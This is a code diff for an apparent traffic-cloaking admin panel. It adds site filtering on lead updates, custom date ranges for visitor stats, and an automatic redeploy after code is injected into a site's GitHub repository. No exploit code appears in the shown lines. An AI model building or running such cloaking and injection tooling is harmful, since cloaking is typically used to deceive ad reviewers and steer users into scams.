@@ -693,11 +693,14 @@ app.post('/api/v1/event', async (req, res) => {
       _cacheLeads[idx].called_at = new Date().toISOString();
       if (pool) {
         const lead = _cacheLeads[idx];
+        const siteClause = site ? 'AND site_id=$4' : '';
+        const params = [lead.called_at, ip, cutoff];
+        if (site) params.push(site.id);
         await dbQuery(
           `UPDATE cloaker_leads SET called=true, called_at=$1 WHERE id = (
-             SELECT id FROM cloaker_leads WHERE ip=$2 AND ts>=$3 ORDER BY ts DESC LIMIT 1
+             SELECT id FROM cloaker_leads WHERE ip=$2 AND ts>=$3 ${siteClause} ORDER BY ts DESC LIMIT 1
            )`,
-          [lead.called_at, ip, cutoff]);
+          params);
       }
       if (!pool) writeJson('leads.json', _cacheLeads.slice(0,500));
     }
@@ -782,9 +785,17 @@ app.get('/' + ADMIN_PATH + '/live-visitors', requireAdmin, (req, res) => {
 app.get('/' + ADMIN_PATH + '/api/stats', requireAdmin, (req, res) => {
   const range = parseInt(req.query.range) || 1;
   const siteFilter = req.query.site || 'all';
-  const cutoff = new Date(Date.now() - range * 24 * 3600 * 1000).toISOString();
-  let logs = _cacheLogs.filter(l => l.ts >= cutoff);
-  let leads = _cacheLeads.filter(l => l.ts >= cutoff);
+  // Support custom date range: from/to query params (ISO date strings)
+  let cutoff, cutoffEnd;
+  if (req.query.from) {
+    cutoff = new Date(req.query.from).toISOString();
+    cutoffEnd = req.query.to ? new Date(req.query.to + 'T23:59:59Z').toISOString() : new Date().toISOString();
+  } else {
+    cutoff = new Date(Date.now() - range * 24 * 3600 * 1000).toISOString();
+    cutoffEnd = new Date().toISOString();
+  }
+  let logs = _cacheLogs.filter(l => l.ts >= cutoff && l.ts <= cutoffEnd);
+  let leads = _cacheLeads.filter(l => l.ts >= cutoff && l.ts <= cutoffEnd);
   if (siteFilter && siteFilter !== 'all') {
     logs  = logs.filter(l => l.site_id === siteFilter);
     leads = leads.filter(l => l.site_id === siteFilter);
@@ -1013,6 +1024,16 @@ app.post('/' + ADMIN_PATH + '/sites/:id/inject', requireAdmin, async (req, res) 
   const idx = _cacheSites.findIndex(s => s.id === req.params.id);
   if (idx !== -1) { _cacheSites[idx].githubInjected = ok; await saveSites(); }
   res.json({ ok });
+  // Trigger Railway redeploy after successful inject
+  if (ok) {
+    triggerRailwayDeploy(_cacheSites[idx] || site).then(deployed => {
+      if (idx !== -1) {
+        _cacheSites[idx].deployStatus = deployed ? 'building' : _cacheSites[idx].deployStatus;
+        saveSites().catch(() => {});
+        broadcast('siteStatus', { id: site.id, deployStatus: _cacheSites[idx].deployStatus });
+      }
+    }).catch(() => {});
+  }
 });
 
 app.post('/' + ADMIN_PATH + '/toggle-cloaking', requireAdmin, async (req, res) => {
@@ -1399,11 +1420,18 @@ textarea.inp{min-height:100px;resize:vertical;}
       </div>
 
       <!-- Time range -->
-      <div class="time-tabs">
+      <div class="time-tabs" style="flex-wrap:wrap;align-items:center;">
         <button class="time-tab active" onclick="setRange(1,this)">24h</button>
         <button class="time-tab" onclick="setRange(7,this)">7d</button>
         <button class="time-tab" onclick="setRange(30,this)">30d</button>
         <button class="time-tab" onclick="setRange(90,this)">90d</button>
+        <button class="time-tab" id="custom-range-btn" onclick="toggleCustomRange(this)">Custom</button>
+        <div id="custom-range-inputs" style="display:none;gap:8px;align-items:center;">
+          <input type="date" class="inp" id="range-from" style="width:160px;padding:5px 10px;font-size:0.8rem;">
+          <span style="color:var(--text3);">to</span>
+          <input type="date" class="inp" id="range-to" style="width:160px;padding:5px 10px;font-size:0.8rem;">
+          <button class="btn btn-primary btn-sm" onclick="applyCustomRange()">Apply</button>
+        </div>
       </div>
 
       <!-- KPI -->
@@ -1765,14 +1793,31 @@ function setupSSE() {
 }
 
 // ── STATS ──
+let customRangeFrom = null, customRangeTo = null;
 function setRange(days, btn) {
-  currentRange = days;
+  currentRange = days; customRangeFrom = null; customRangeTo = null;
   document.querySelectorAll('.time-tab').forEach(b => b.classList.remove('active'));
   btn.classList.add('active');
+  document.getElementById('custom-range-inputs').style.display = 'none';
+  loadStats();
+}
+function toggleCustomRange(btn) {
+  const inp = document.getElementById('custom-range-inputs');
+  const visible = inp.style.display !== 'none' && inp.style.display !== '';
+  document.querySelectorAll('.time-tab').forEach(b => b.classList.remove('active'));
+  if (!visible) { inp.style.display = 'flex'; btn.classList.add('active'); } 
+  else { inp.style.display = 'none'; }
+}
+function applyCustomRange() {
+  customRangeFrom = document.getElementById('range-from').value;
+  customRangeTo   = document.getElementById('range-to').value;
+  if (!customRangeFrom) return;
   loadStats();
 }
 function loadStats() {
-  fetch('/' + ADMIN_PATH + '/api/stats?range=' + currentRange + '&site=' + globalSiteFilter)
+  let url = '/' + ADMIN_PATH + '/api/stats?range=' + currentRange + '&site=' + globalSiteFilter;
+  if (customRangeFrom) url += '&from=' + customRangeFrom + (customRangeTo ? '&to=' + customRangeTo : '');
+  fetch(url)
     .then(r => r.json()).then(s => {
       document.getElementById('kpi-total').textContent = s.total;
       document.getElementById('kpi-allowed').textContent = s.allowed;
